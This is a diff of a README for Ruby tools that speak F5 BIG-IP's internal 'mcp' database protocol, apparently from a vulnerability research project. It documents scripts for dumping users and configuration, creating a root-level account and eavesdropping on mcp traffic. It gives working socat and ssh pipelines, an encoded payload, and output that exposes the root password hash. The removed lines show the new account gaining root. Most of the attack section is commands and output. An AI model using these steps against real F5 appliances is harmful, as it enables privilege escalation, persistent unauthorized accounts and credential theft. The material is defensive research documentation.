@@ -1,7 +1,18 @@
 This isn't really done or ready yet, but I wanted to get the code checked in.
 
 This basically implements F5's database protocol, "mcp", which operates through
-a UNIX domain socket.
+a UNIX domain socket. That means that you need a shell on the F5 device before
+you can use any of these. You'll typically forward the output from a script
+to `/var/run/mcp` using `socat`, then feed the response into `mcp-parser.rb`.
+More details below.
+
+A quick summary of the scripts:
+
+* `mcp-getloot.rb` - Generates a message that will dump users and variables
+* `mcp-privesc.rb` - Generates a message that will create a user account
+* `mcp-parser.rb` - Parses mcp messages that arrive on stdin
+* `mcp-mitm.rb` - Eavesdrop mcp messages on a target host (requires passwordless ssh to root to be configured)
+* `mcp-builder.rb` - A library for building mcp messages (you don't need to use directly)
 
 # What is mcp?
 
@@ -24,12 +35,16 @@ cool. You can use `mcp-privesc.rb` to create that packet.
 # Building and Sending MCP Messages
 
 To communicate with MCP directly, you'll generally use `socat`. The code in
-`mcp-builder.rb` can create packets (though currently only does privilege
-escalation via `mcp-privesc.rb`).
+`mcp-builder.rb` can create packets, though isn't designed to be run directly.
+The scripts you'll probably want to use directly are:
 
-To use `mcp-privesc.rb`, run it and find a way to send the output into a
-socket. You can provide optional username / password parameters as well. Here's
-an example where we gzip + base64-encode the output:
+* `mcp-getloot.rb` - to get users and configuration settings
+* `mcp-privesc.rb` - to add a new root-level account
+* `mcp-parser.rb` - to parse the response (on stdin)
+
+To use one of the query scripts, execute it and find a way to send the output
+into the UNIX socket on the target. Here's an example where we gzip +
+base64-encode the output from `mcp-privesc.rb`:
 
 ```
 $ ruby ./mcp-privesc.rb blogtest MyFunPW | gzip | base64 -w0
@@ -40,8 +55,9 @@ Send it to the target using: socat -t100 - UNIX-CONNECT:/var/run/mcp < mcpmessag
 H4sIAAAAAAAAA2NgYBBnQAICGgy8QIpfQJOBH0izM7AmpuRm5oFkkJVx54CVcajaMbBChSxR5KPA8oYCLGBaU4ANbBwXA0dSTn56SWpxiQA7RKcAB8yiaMecnFgg8yAWg3ZyC4LpjdxC6AbJnwSLcDCwOefn5ubnCcZDDOaWBItzM3DqJ2Xm6SclFmdwi4ClGLmFwVIpDEkqZiplKVV5hWmVySqFlj6uXrkZOS5R3sYegZEGPgbhpZneaRGJ3l4lgbn+keY5ntm+wfqeFWklIblRxXoBKTmRERW5FVlBgSZppkaW6TmGxn7FheE5USkp+qnZxaV5XiEGhmCnIXsoD+wRBgAyeb1ueQEAAA==
 ```
 
-Then we can copy and paste it to the F5 BigIP target, and send it using this
-command (not that we're doing this as a non-root user as a demonstration):
+Then we can copy and paste it to an ssh session on the target, where it's sent
+to the UNIX socket (note that we're doing this as a non-root user as a
+demonstration that it's possible):
 
 ```
 $ whoami
@@ -72,30 +88,44 @@ result (structure [22 bytes]):
  result_type (tag) = userdb_entry
 ```
 
-You can, of course, do it all as a single command, although that doesn't really make sense for our `privesc` command, considering we're already root:
+You can, of course, do it all as a single command; here how you can use
+`mcp-getloot.rb`:
 
 ```
-$ ruby ./mcp-privesc.rb blogtest2 MyFunPW | ssh root@10.0.0.162 socat -t100 - UNIX-CONNECT:/var/run/mcp | ruby ./mcp-parser.rb
-Attempting to create a crypt-sha512 hash of the password
-Writing an `mcp` message to stdout that'll create an account: blogtest2 / $6$dufuourf$gfuhZJZcXpfjcOTdyJdwsoLLX4EVwn7M9lDxk3LqDtj0PhwZS6Av2ua363xyzqNQFhVOWSiT3eYkInQN/aDkg.
+$ ruby ./mcp-getloot.rb | ssh root@10.0.0.162 socat -t100 - UNIX-CONNECT:/var/run/mcp | ruby ./mcp-parser.rb | head -n30
+Writing an `mcp` message to stdout that'll query for interesting stuff
 Send it to the target using: socat -t100 - UNIX-CONNECT:/var/run/mcp < mcpmessage.bin
 
-result (structure [22 bytes]):
- result_code (ulong) = 0x00000000 (0)
- result_operation (tag) = user_authenticated
- result_type (tag) = user_authenticated_name
-result (structure [22 bytes]):
- result_code (ulong) = 0x00000000 (0)
- result_operation (tag) = create
- result_type (tag) = userdb_entry
-
-ron@fedora ~/shared/analysis/f5-big-ip-0day/analysis/mcp/parser [main]× $ ssh blogtest2@10.0.0.162
-(blogtest2@10.0.0.162) Password: 
-(blogtest2@10.0.0.162) You are required to change your password immediately (root enforced)
+query_reply (structure [949 bytes]):
+ userdb_entry (structure [233 bytes]):
+  userdb_entry_name (string [6 bytes]) = "root"
+  trunk_virtual_mbr_transaction_id (ulong) = 0x00000001 (1)
+  userdb_entry_partition_id (string [8 bytes]) = "Common"
+  fw_analytics_settings_dns_collect_dst_i... (long) = 0xffffffff (4294967295)
+  userdb_entry_is_system (ulong) = 0x00000001 (1)
+  userdb_entry_oldpasswd (string [2 bytes]) = ""
+  userdb_entry_shell (string [11 bytes]) = "/bin/bash"
+  userdb_entry_gecos (string [6 bytes]) = "root"
+  userdb_entry_is_crypted (ulong) = 0x00000001 (1)
+  userdb_entry_passwd (string [100 bytes]) = "$6$UIHYzBX6$UClrSPt1o/G2meP27zBzRJnAjWEIkhNEQzqDYwn5gtnoKqFeGhnJveUUHGavaPU1FO9eif2pnADjDN/5YgMI3/"
+  userdb_entry_description (string [2 bytes]) = ""
+  userdb_entry_object_id (ulong) = 0x00002a70 (10864)
+ userdb_entry (structure [251 bytes]):
+  userdb_entry_name (string [7 bytes]) = "admin"
 [...]
-
-[blogtest2@localhost:NO LICENSE:Standalone] ~ # whoami
-root
+db_variable (structure [224 bytes]):
+  db_variable_name (string [38 bytes]) = "platform.diskmonitor.freelast.vmdisk"
+  db_variable_transaction_id (ulong) = 0x0000004b (75)
+  db_variable_scf_config (string [7 bytes]) = "false"
+  db_variable_maximum (string [2 bytes]) = ""
+  db_variable_minimum (string [2 bytes]) = ""
+  db_variable_data_type (string [9 bytes]) = "integer"
+  db_variable_sync_type (string [18 bytes]) = "private_internal"
+  db_variable_default (string [3 bytes]) = "0"
+  db_variable_value (string [3 bytes]) = "0"
+  db_variable_display_name (string [38 bytes]) = "Platform.DiskMonitor.FreeLast.vmdisk"
+  db_variable_object_id (ulong) = 0x0000e705 (59141)
+  db_variable_enumerated (array [6 bytes]): Array data: 000f00000000
 ```
 
 # Connection Eavesdropping
